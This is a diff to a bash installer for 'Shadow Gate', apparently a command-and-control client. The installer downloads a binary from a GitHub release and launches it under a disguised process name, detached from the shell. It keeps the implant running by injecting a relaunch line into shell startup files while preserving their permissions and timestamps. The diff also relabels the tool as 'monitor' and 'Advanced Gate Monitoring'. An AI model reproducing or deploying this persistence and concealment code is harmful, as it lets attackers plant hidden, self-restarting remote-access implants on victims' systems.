@@ -153,6 +153,7 @@ detect_os() {
 	esac
 }
 
+# Test if directory can be used to store executable
 check_exec_dir(){
 	[[ ! -d "$(dirname "$1")" ]] && print_debug "$1 is not a directory!" && return 1
 	[[ ! -w "$1" ]] && print_debug "$1 directory not writable!" && return 1;
@@ -160,6 +161,7 @@ check_exec_dir(){
 	return 0;
 }
 
+# inject a string into the 2nd line of a file and retain PERM/TIMESTAMP
 inject_to_file()
 {
 	local fname="$1"
@@ -182,6 +184,7 @@ create_client_dir() {
 	print_fatal "Current directory is not writable or executable! Exiting..."
 }
 
+# Download binary from URL
 download_binary() {
 	local target_path="$1"
 	local download_url="$2"
@@ -189,7 +192,7 @@ download_binary() {
 	# Set default download URL if not provided
 	if [[ -z "$download_url" ]]; then
 		# Default to GitHub releases or your custom URL
-		download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/client-${OS_NAME}-${OS_ARCH}"
+		download_url="https://github.com/Haxor-World/Shadow-Gate/releases/download/1.0.0/monitor-${OS_NAME}-${OS_ARCH}"
 	fi
 	
 	print_debug "Downloading binary from: $download_url"
@@ -212,13 +215,7 @@ download_binary() {
 	return 0
 }
 
-exec_hidden() {
-	# Check if client is already running to prevent double execution
-	if pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
-		print_debug "Client already running with process name: ${PROC_HIDDEN_NAME}"
-		return 0
-	fi
-	
+exec_hidden() {	
 	# Validate required variables
 	if [[ -z "${SECRET}" ]]; then
 		print_error "Missing required SECRET environment variable"
@@ -228,17 +225,11 @@ exec_hidden() {
 	# Set environment variables for client
 	export SECRET="${SECRET}"
 	[[ -n "${SERVER_URL}" ]] && export SERVER_URL="${SERVER_URL}"
-	[[ -n "${STEALTH_MODE}" ]] && export STEALTH_MODE="${STEALTH_MODE}"
 	
 	set +m; exec -a "${PROC_HIDDEN_NAME}" ${CLIENT_PATH} &
 	disown -a &> "$ERR_LOG"
 	
-	# Verify process started successfully
 	sleep 2
-	if ! pgrep -f "${PROC_HIDDEN_NAME}" >/dev/null 2>&1; then
-		print_error "Failed to start client process"
-		return 1
-	fi
 }
 
 install_init_scripts() {
@@ -258,14 +249,13 @@ install_init_scripts() {
 	# Build environment variables string
 	local env_vars="SECRET='${SECRET}'"
 	[[ -n "${SERVER_URL}" ]] && env_vars="${env_vars} SERVER_URL='${SERVER_URL}'"
-	[[ -n "${STEALTH_MODE}" ]] && env_vars="${env_vars} STEALTH_MODE='${STEALTH_MODE}'"
 	
 	INJECT_LINE="
 if ! pgrep -f '${PROC_HIDDEN_NAME}' >/dev/null 2>&1; then
 	set +m; HOME=$HOME ${env_vars} $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${CLIENT_PATH}\" &>/dev/null &
 fi"
 	for target in "${inject_targets[@]}"; do
-		grep -q "rust-c2-client" "$target" &>"$ERR_LOG" && print_status "!! WARNING !! Shadow Gate client already installed via $(basename "$target")" && continue 
+		grep -q "${PROC_HIDDEN_NAME}" "$target" &>"$ERR_LOG" && print_status "!! WARNING !! Shadow Gate client already installed via $(basename "$target")" && continue 
 		[[ ! -f $target ]] && continue
 		print_progress "Installing access via $(basename "$target")"
 	if inject_to_file "$target" "$INJECT_LINE"; then
@@ -324,8 +314,6 @@ print_usage() {
 	echo -e "${BRIGHT_WHITE}   Process Name: ${BRIGHT_CYAN}$PROC_HIDDEN_NAME${RESET}"
 	echo -e "${BRIGHT_WHITE}   Binary Location: ${BRIGHT_CYAN}$CLIENT_PATH${RESET}"
 	echo
-	echo -e "${BRIGHT_WHITE}${BOLD}Persistence Configuration:${RESET}"
-	echo -e "${BRIGHT_WHITE}   Persistence Method: ${BRIGHT_CYAN}${PERSISTENCE_METHOD}${RESET}"
 	echo -e "${DIM}${GRAY}═══════════════════════════════════════════════════════════════${RESET}"
 	echo -e "${DIM}${GRAY}Shadow Gate is now running ${RESET}"
 	echo -e "${DIM}${GRAY}═══════════════════════════════════════════════════════════════${RESET}\n"
@@ -357,6 +345,7 @@ print_banner() {
 	echo -e "        ${BRIGHT_YELLOW}╚██████╔╝██║  ██║   ██║   ███████╗${RESET}"
 	echo -e "        ${BRIGHT_YELLOW} ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝${RESET}"
 	echo ""
+	echo -e "${BRIGHT_WHITE}${BOLD}              ◆ Advanced Gate Monitoring v1.0 ◆${RESET}"
 }
 print_banner
 
